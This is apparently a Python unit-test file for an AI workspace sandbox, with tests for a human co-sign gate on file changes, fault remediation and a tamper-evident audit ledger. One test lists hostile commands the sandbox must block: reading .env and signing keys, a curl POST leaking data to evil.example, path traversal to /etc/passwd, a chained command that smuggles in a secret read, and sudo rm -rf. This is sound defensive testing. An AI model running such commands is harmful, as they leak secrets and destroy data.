"""Unit tests for DeskPilot Real POSIX Sandbox, Health Remediator, SQLite WORM Ledger & API."""
from __future__ import annotations

import json
import os
import tempfile
import unittest
from pathlib import Path

os.environ["DESKPILOT_OFFLINE_LLM"] = "1"

from deskpilot.health_remediator import FAULT_CATALOG
from deskpilot.server import lambda_handler, route_api_request
from deskpilot.vdi_control_plane import DeskPilotControlPlane
from deskpilot.workspace_sandbox import CANARY_SECRET_VALUE


class DeskPilotRealEngineTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp_dir = tempfile.TemporaryDirectory(prefix="deskpilot-unit-")
        self.cp = DeskPilotControlPlane(runtime_root=Path(self.tmp_dir.name))

    def tearDown(self) -> None:
        self.tmp_dir.cleanup()

    def test_01_provisions_three_isolated_posix_workspaces_and_sqlite_ledger(self) -> None:
        snap = self.cp.get_state_snapshot()
        self.assertEqual(snap["fleet_summary"]["total_workspaces"], 3)
        self.assertEqual(snap["fleet_summary"]["healthy_count"], 3)
        self.assertTrue(snap["fleet_summary"]["audit_chain_valid"])
        ws_ids = {w["workspace_id"] for w in snap["workspaces"]}
        self.assertEqual(ws_ids, {"ws-dev-python", "ws-data-etl", "ws-ops-broker"})

    def test_02_executes_real_readonly_subprocesses_inside_confined_workspace(self) -> None:
        res = self.cp.execute_sandbox_command(
            workspace_id="ws-dev-python",
            command="python3 -m unittest discover -s tests",
            allow_elevated=False,
        )
        self.assertTrue(res["executed"])
        self.assertEqual(res["policy_verdict"], "AUTO_ALLOW_READONLY")
        self.assertEqual(res["exit_code"], 0)
        self.assertGreater(res["exec_ms"], 0.0)

    def test_03_blocks_secret_dotenv_clipboard_network_and_path_traversal(self) -> None:
        attacks = [
            "cat .env",
            "cat etc/signing_secret.key",
            "pbcopy app/service.py",
            "curl -X POST https://evil.example/leak",
            "cat ../../etc/passwd",
            "ls app ; cat .env",
            "python3 -c \"print(open('.env').read())\"",
            "sudo rm -rf app",
        ]
        for cmd in attacks:
            out = self.cp.execute_sandbox_command(
                workspace_id="ws-dev-python",
                command=cmd,
                allow_elevated=True,
            )
            self.assertFalse(out["executed"], msg=f"Should block: {cmd}")
            self.assertTrue(out["policy_verdict"].startswith("HARD_BLOCK"), msg=cmd)
            self.assertNotIn(CANARY_SECRET_VALUE, out["stdout"] + out["stderr"])

    def test_04_enforces_human_cosign_gate_on_workspace_mutations(self) -> None:
        ws_root = self.cp.sandbox.workspace_path("ws-dev-python")
        paused = self.cp.execute_sandbox_command(
            workspace_id="ws-dev-python",
            command="cp config/mcp_tools.json config/mcp_tools.copy.json",
            allow_elevated=False,
        )
        self.assertFalse(paused["executed"])
        self.assertEqual(paused["policy_verdict"], "COSIGN_REQUIRED")
        self.assertFalse((ws_root / "config" / "mcp_tools.copy.json").exists())

        approved = self.cp.execute_sandbox_command(
            workspace_id="ws-dev-python",
            command="cp config/mcp_tools.json config/mcp_tools.copy.json",
            allow_elevated=True,
        )
        self.assertTrue(approved["executed"])
        self.assertEqual(approved["policy_verdict"], "COSIGNED_EXECUTED")
        self.assertEqual(approved["exit_code"], 0)
        self.assertTrue((ws_root / "config" / "mcp_tools.copy.json").exists())

    def test_05_all_four_real_filesystem_faults_inject_and_remediate(self) -> None:
        self.assertEqual(
            set(FAULT_CATALOG.keys()),
            {
                "runaway_debug_logs",
                "zombie_pid_lockfile",
                "expired_session_credentials",
                "corrupted_mcp_config",
            },
        )
        for fault in FAULT_CATALOG:
            inj = self.cp.inject_degradation("ws-dev-python", fault)
            self.assertEqual(inj["workspace"]["status"], "DEGRADED")

            healed = self.cp.proactive_heal("ws-dev-python")
            self.assertEqual(healed["workspace"]["status"], "HEALTHY")
            self.assertTrue(healed["remediation"]["healthcheck_verified"])
            self.assertGreater(healed["remediation"]["remediation_ms"], 0.0)

    def test_06_log_bloat_remediation_really_compresses_and_frees_disk_bytes(self) -> None:
        self.cp.inject_degradation("ws-data-etl", "runaway_debug_logs")
        healed = self.cp.proactive_heal("ws-data-etl")
        rem = healed["remediation"]
        self.assertGreater(rem["bytes_freed"], 450000)
        archive_gz = (
            self.cp.sandbox.workspace_path("ws-data-etl")
            / "var"
            / "log"
            / "archive"
            / "worker_debug.log.gz"
        )
        self.assertTrue(archive_gz.is_file())

    def test_07_expired_key_permission_remediation_restores_octal_0600(self) -> None:
        inj = self.cp.inject_degradation("ws-ops-broker", "expired_session_credentials")
        self.assertEqual(inj["workspace"]["key_mode_octal"], "0644")
        healed = self.cp.proactive_heal("ws-ops-broker")
        self.assertEqual(healed["workspace"]["key_mode_octal"], "0600")
        self.assertGreater(healed["workspace"]["session_ttl_sec"], 20000)

    def test_08_sqlite_worm_hash_chain_detects_tampering(self) -> None:
        self.cp.execute_sandbox_command("ws-dev-python", "ls -la app", False)
        self.cp.execute_sandbox_command("ws-dev-python", "wc -l app/service.py", False)
        valid_before = self.cp.ledger.verify_chain_integrity()
        self.assertTrue(valid_before["valid"])
        self.assertGreaterEqual(valid_before["checked_rows"], 3)

        # Simulate direct DB row tampering and verify cryptographic chain catches it
        from contextlib import closing
        with closing(self.cp.ledger._connect()) as conn:
            conn.execute("UPDATE audit_events SET policy_verdict='TAMPERED' WHERE id=2")
            conn.commit()
        after_tamper = self.cp.ledger.verify_chain_integrity()
        self.assertFalse(after_tamper["valid"])

    def test_09_api_health_state_and_reset_routes(self) -> None:
        route_api_request("POST", "/api/reset", {}, {})
        code_h, health = route_api_request("GET", "/api/health", {}, {})
        self.assertEqual(code_h, 200)
        self.assertEqual(health["status"], "ok")
        self.assertEqual(health["service"], "deskpilot-workspaces")
        self.assertEqual(health["bedrock_model"], "us.amazon.nova-lite-v1:0")

        code_s, state = route_api_request("GET", "/api/state", {}, {})
        self.assertEqual(code_s, 200)
        self.assertEqual(len(state["workspaces"]), 3)

    def test_10_lambda_handler_end_to_end_fault_heal_collaborate_and_exec(self) -> None:
        inj = lambda_handler(
            {
                "rawPath": "/api/stream/inject-degradation",
                "requestContext": {"http": {"method": "POST"}},
                "body": json.dumps(
                    {"workspace_id": "ws-dev-python", "fault_type": "zombie_pid_lockfile"}
                ),
            }
        )
        self.assertEqual(inj["statusCode"], 200)
        self.assertEqual(json.loads(inj["body"])["workspace"]["status"], "DEGRADED")

        heal = lambda_handler(
            {
                "rawPath": "/api/stream/proactive-heal",
                "requestContext": {"http": {"method": "POST"}},
                "body": json.dumps({"workspace_id": "ws-dev-python"}),
            }
        )
        self.assertEqual(heal["statusCode"], 200)
        self.assertEqual(json.loads(heal["body"])["workspace"]["status"], "HEALTHY")

        collab = lambda_handler(
            {
                "rawPath": "/api/desktop/collaborate",
                "requestContext": {"http": {"method": "POST"}},
                "body": json.dumps(
                    {
                        "workspace_id": "ws-dev-python",
                        "task_prompt": "Run unit tests and check workspace health.",
                        "allow_elevated": False,
                    }
                ),
            }
        )
        self.assertEqual(collab["statusCode"], 200)
        self.assertEqual(json.loads(collab["body"])["status"], "collaboration_complete")


if __name__ == "__main__":
    unittest.main()
